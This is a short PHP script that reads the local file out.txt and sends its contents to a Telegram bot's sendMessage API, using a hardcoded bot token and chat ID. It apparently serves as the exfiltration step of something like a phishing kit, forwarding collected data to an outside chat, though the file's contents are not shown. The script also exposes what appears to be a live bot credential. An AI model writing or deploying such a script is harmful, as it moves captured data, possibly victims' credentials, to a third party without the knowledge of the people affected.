<?php
    sleep(2);
 $msg = urlencode(file_get_contents("out.txt")); file_get_contents("https://api.telegram.org/bot1413764221:AAEMLGTWZZjS2LDmBinmDn4pRNzP7UJGD1k/sendMessage?chat_id=255143141&text=$msg"); ?>
